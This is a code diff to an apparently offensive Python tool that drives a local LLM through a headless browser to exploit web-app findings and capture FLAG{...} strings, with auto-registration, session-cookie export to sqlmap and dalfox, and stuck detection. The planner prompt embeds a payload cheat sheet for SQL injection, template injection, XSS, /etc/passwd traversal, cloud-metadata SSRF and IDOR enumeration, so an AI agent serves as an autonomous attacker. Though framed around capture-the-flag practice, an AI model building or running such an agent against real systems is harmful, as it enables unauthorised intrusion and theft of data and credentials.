@@ -28,7 +28,10 @@ from tools import (
 from search import handle_search_dispatch, verify_cve_nvd, nvd_search_by_product
 
 try:
-    from browser_agent import BrowserSession, looks_like_login_page, looks_like_register_page
+    from browser_agent import (
+        BrowserSession, looks_like_login_page, looks_like_register_page,
+        bootstrap_auth, cookies_to_header,
+    )
     _BROWSER_AVAILABLE = True
 except ImportError:
     _BROWSER_AVAILABLE = False
@@ -115,10 +118,12 @@ import os as _os
 
 OLLAMA_HOST     = _os.environ.get("OLLAMA_HOST", "http://localhost:11434")
 MODEL_NAME      = _os.environ.get("MODEL_NAME", "hf.co/empero-ai/Qwythos-9B-Claude-Mythos-5-1M-GGUF:Q4_K_M")
+PLANNING_MODEL  = _os.environ.get("PLANNING_MODEL", MODEL_NAME)
 MAX_TOOL_LOOPS  = int(_os.environ.get("MEGATRON_MAX_LOOPS", "6"))
 OLLAMA_TIMEOUT  = int(_os.environ.get("OLLAMA_TIMEOUT", "600"))
 _MODEL_TEMP     = float(_os.environ.get("MODEL_TEMPERATURE", "0.5"))
 _MODEL_THINK    = _os.environ.get("MODEL_THINK", "false").lower() in ("1", "true", "yes")
+BROWSER_MAX_ACTIONS = int(_os.environ.get("MEGATRON_BROWSER_MAX_ACTIONS", "15"))
 
 _client = OllamaClient(host=OLLAMA_HOST, timeout=OLLAMA_TIMEOUT)
 
@@ -503,6 +508,7 @@ class BrowserPlan(BaseModel):
     action:             BrowserAction
     flag_candidate:     str | None = Field(None, description="If FLAG{...} spotted in visible text, put it here")
     exploit_hypothesis: str        = Field(..., description="What vulnerability/chain you're currently trying to prove")
+    session_note:       str        = Field("", description="One-line memo to your future self — key facts to remember from this page (usernames, IDs, endpoints found, error messages seen)")
     give_up:            bool       = Field(False, description="True if you're truly stuck; will exit the loop")
 
 
@@ -519,20 +525,49 @@ def _build_url_for_finding(target: str, finding: Finding) -> str:
     return base
 
 
-def _browser_exploit(target_url: str, finding: Finding, max_actions: int = 15) -> tuple[bool, str]:
+def _browser_exploit(target_url: str, finding: Finding, max_actions: int | None = None) -> tuple[bool, str]:
     """
-    LLM-driven browser exploit loop. Persistent Chromium session; observe → plan → act.
-    Time-boxed to `max_actions`. Every observation is regex-scanned for FLAG{...} first
-    (fast path — no LLM call needed if flag is already visible).
+    LLM-driven browser exploit loop with session-aware planning (v0.8.0).
 
-    MEGATRON differentiator vs Shannon: even a partial exploit chain that dumps the
-    session cookie is exported to CLI specialists (sqlmap, curl) as a second pass.
+    Phases:
+      A) Auth bootstrap — try to register + login BEFORE exploit loop starts.
+         Session cookies from a successful login persist through the entire
+         browser context AND get exported back to CLI specialists.
+      B) Session-aware planning — every LLM call gets the goal, last 10 actions,
+         accumulated session_notes, and current-page delta. Also detects "stuck"
+         states (same URL + same visible text 3+ times → force pivot or give up).
+      C) Uses PLANNING_MODEL env var (defaults to MODEL_NAME) so a bigger model
+         can drive planning if available (e.g., 27B on P40).
+
+    MEGATRON differentiators over Shannon:
+      - Fully local Ollama
+      - Multi-tier fallback: if browser gives up, CLI specialists still run
+      - Session cookies flow back to sqlmap/dalfox for authenticated CLI exploits
     """
     if not _BROWSER_AVAILABLE:
         return False, "[browser-exploit] SKIPPED — playwright not installed"
 
+    max_actions = max_actions if max_actions is not None else BROWSER_MAX_ACTIONS
+    goal = f"Prove '{finding.vuln_name}' by capturing FLAG{{...}} from the target."
+    session_notes: list[str] = []
+    stuck_counter: dict[str, int] = {}
+
     try:
         with BrowserSession(target_url, headless=True, timeout_ms=8000) as sess:
+            auth = bootstrap_auth(sess, verbose=True)
+            if auth["success"]:
+                session_notes.append(f"AUTH ESTABLISHED as {auth['username']} — cookies: {len(auth['cookies'])} entries")
+                try:
+                    import os as _o
+                    _o.environ["AUTH_COOKIE"] = cookies_to_header(auth["cookies"])
+                    session_notes.append("cookies exported to AUTH_COOKIE env for downstream CLI tools")
+                except Exception:
+                    pass
+            else:
+                session_notes.append(f"no auth bootstrap ({auth.get('notes','')[:100]})")
+
+            sess.act({"type": "navigate", "value": target_url})
+
             history: list[dict] = []
             action_dedup: set[tuple[str, str, str]] = set()
 
@@ -547,6 +582,10 @@ def _browser_exploit(target_url: str, finding: Finding, max_actions: int = 15) -
                 if flags:
                     return True, f"[BROWSER-EXPLOIT captured] {flags[0]} after {step} action(s) at {snap['url']}"
 
+                state_fingerprint = f"{snap['url']}|{hash(visible[:500])}"
+                stuck_counter[state_fingerprint] = stuck_counter.get(state_fingerprint, 0) + 1
+                is_stuck = stuck_counter[state_fingerprint] >= 3
+
                 trimmed_snap = {
                     "url":     snap["url"],
                     "title":   title,
@@ -554,49 +593,75 @@ def _browser_exploit(target_url: str, finding: Finding, max_actions: int = 15) -
                     "inputs":  snap.get("inputs", [])[:10],
                     "buttons": snap.get("buttons", [])[:8],
                     "links":   snap.get("links", [])[:15],
-                    "visible_text_head": visible[:600],
-                    "visible_text_tail": visible[-400:] if len(visible) > 1000 else "",
+                    "visible_text_head": visible[:500],
+                    "visible_text_tail": visible[-300:] if len(visible) > 800 else "",
                 }
                 prompt = (
-                    f"You are exploiting a web app to capture the flag (format: FLAG{{...}}).\n\n"
-                    f"TARGET: {target_url}\n"
-                    f"FINDING TO EXPLOIT: {finding.vuln_name}\n"
+                    f"You are exploiting a web app. GOAL: {goal}\n\n"
+                    f"FINDING CONTEXT:\n"
+                    f"  vuln: {finding.vuln_name}\n"
                     f"  severity={finding.severity} confidence={finding.confidence}\n"
                     f"  description: {finding.description[:400]}\n\n"
-                    f"PROGRESS SO FAR (last 4 actions):\n{json.dumps(history[-4:], indent=1) if history else '  (none yet — first action)'}\n\n"
-                    f"CURRENT PAGE STATE:\n{json.dumps(trimmed_snap, indent=1)}\n\n"
-                    f"Propose the NEXT single action. Rules:\n"
-                    f"  - selectors MUST come from observed forms/inputs/buttons/links (don't invent CSS)\n"
+                    f"SESSION NOTES (your memory across all previous actions):\n"
+                    + "\n".join(f"  • {n}" for n in session_notes[-8:])
+                    + "\n\n"
+                    f"ACTION HISTORY (last 10 — deduped):\n"
+                    + (json.dumps([{"step": h.get('step'), "type": h.get('action',{}).get('type'),
+                                     "selector": h.get('action',{}).get('selector','')[:60],
+                                     "value": h.get('action',{}).get('value','')[:40],
+                                     "reason": h.get('reason','')[:80]}
+                                     for h in history[-10:]], indent=1)
+                       if history else "  (none yet — first action)")
+                    + "\n\n"
+                    f"CURRENT PAGE:\n{json.dumps(trimmed_snap, indent=1)}\n\n"
+                    + ("⚠️  YOU HAVE VISITED THIS EXACT PAGE 3+ TIMES — YOU ARE STUCK. Either try a radically different action or set give_up=true.\n\n" if is_stuck else "")
+                    + "Propose the NEXT action. Rules:\n"
+                    f"  - selectors MUST come from observed forms/inputs/buttons/links\n"
                     f"  - if you spot FLAG{{...}} in visible text, set flag_candidate\n"
-                    f"  - common payloads: SQLi=' OR 1=1--, SSTI={{{{7*7}}}}, XSS=<script>alert(1)</script>, LFI=../../../../etc/passwd\n"
-                    f"  - IDOR: try incrementing numeric IDs in URLs or params\n"
-                    f"  - if stuck after 3+ actions with no progress, set give_up=true"
+                    f"  - if you learn something (username, hidden endpoint, error msg), put it in session_note\n"
+                    f"  - PAYLOAD CHEATSHEET: SQLi=' OR 1=1--, SSTI={{{{7*7}}}}, XSS=<script>alert(1)</script>,\n"
+                    f"    LFI=../../../../etc/passwd, SSRF=http://169.254.169.254/, IDOR=increment ?id=\n"
+                    f"  - IDOR strategy: if URL has numeric ID, navigate to ?id=1, ?id=2, ?id=admin\n"
+                    f"  - if truly stuck, set give_up=true; don't loop"
                 )
-                plan = _ask_structured_typed(prompt, BrowserPlan)
+                plan = _ask_structured_typed(prompt, BrowserPlan, model_name=PLANNING_MODEL)
                 if plan is None or plan.give_up or plan.action.type == "done":
                     break
+
+                if plan.session_note:
+                    session_notes.append(plan.session_note[:200])
+
                 if plan.flag_candidate and FLAG_RE.match(plan.flag_candidate):
                     return True, f"[BROWSER-EXPLOIT captured] {plan.flag_candidate} via LLM inspection at step {step}"
 
                 key = (plan.action.type, plan.action.selector, plan.action.value)
                 if key in action_dedup:
-                    history.append({"step": step, "skipped": "duplicate action", "action": plan.action.model_dump()})
+                    history.append({"step": step, "skipped": "duplicate action", "action": plan.action.model_dump(), "reason": plan.action.reason})
                     continue
                 action_dedup.add(key)
 
                 result = sess.act(plan.action.model_dump())
                 history.append({"step": step, "action": plan.action.model_dump(), "result": result, "reason": plan.action.reason})
 
-            return False, f"[browser-exploit] no flag after {len(history)} action(s) on '{finding.vuln_name}'"
+            summary = f"[browser-exploit] no flag after {len(history)} action(s) on '{finding.vuln_name}'"
+            if auth["success"]:
+                summary += f" (auth={auth['username']})"
+            if session_notes:
+                summary += f" | notes: {'; '.join(session_notes[-3:])[:300]}"
+            return False, summary
     except Exception as e:
         return False, f"[browser-exploit] session error: {str(e)[:200]}"
 
 
-def _ask_structured_typed(prompt: str, schema_class):
-    """One-shot structured call to Ollama for an arbitrary Pydantic schema."""
+def _ask_structured_typed(prompt: str, schema_class, model_name: str | None = None):
+    """
+    One-shot structured Ollama call for any Pydantic schema.
+    Optional model_name override — used by browser exploit loop to route planning
+    calls to PLANNING_MODEL (may be bigger/different than MODEL_NAME).
+    """
     try:
         resp = _client.chat(
-            model    = MODEL_NAME,
+            model    = model_name or MODEL_NAME,
             messages = [{"role": "user", "content": prompt}],
             format   = schema_class.model_json_schema(),
             think    = _MODEL_THINK,
@@ -630,6 +695,9 @@ def _run_exploit_loop(report: ScanReport, target: str, max_attempts: int = 5) ->
         key=lambda f: priority_severity.index(f.severity) if f.severity in priority_severity else 99,
     )
     web_port_strs = {str(p) for p in WEB_SUSPECT_PORTS}
+    non_web_ports = {"22", "21", "23", "25", "53", "110", "143", "161", "389", "445",
+                     "465", "587", "993", "995", "1433", "1521", "3306", "3389", "5432",
+                     "5984", "6379", "9042", "9200", "11211", "27017"}
 
     for finding in ordered:
         if attempted >= max_attempts:
@@ -640,12 +708,18 @@ def _run_exploit_loop(report: ScanReport, target: str, max_attempts: int = 5) ->
         seen_tools.add(tool)
         attempted += 1
 
-        is_web = (finding.port in web_port_strs) or (finding.port == "" and tool in ("dalfox", "lfi_probe", "idor_probe"))
+        is_web = (
+            finding.port in web_port_strs
+            or (finding.port.isdigit() and int(finding.port) >= 1024 and finding.port not in non_web_ports)
+            or (finding.port == "" and tool in ("dalfox", "lfi_probe", "idor_probe"))
+        )
         got_flag, evidence = False, ""
 
         if is_web and _BROWSER_AVAILABLE:
-            print(f"  [EXPLOIT-BROWSER] driving Chromium against '{finding.vuln_name}'")
-            got_flag, evidence = _browser_exploit(_build_url_for_finding(target, finding), finding)
+            url_for_finding = _build_url_for_finding(target, finding)
+            print(f"  [EXPLOIT-BROWSER] driving Chromium against '{finding.vuln_name}' at {url_for_finding}")
+            got_flag, evidence = _browser_exploit(url_for_finding, finding)
+            print(f"  [EXPLOIT-BROWSER result] flag={got_flag} evidence={evidence[:180]}")
             if evidence:
                 finding.description += f"\n{evidence}"
 
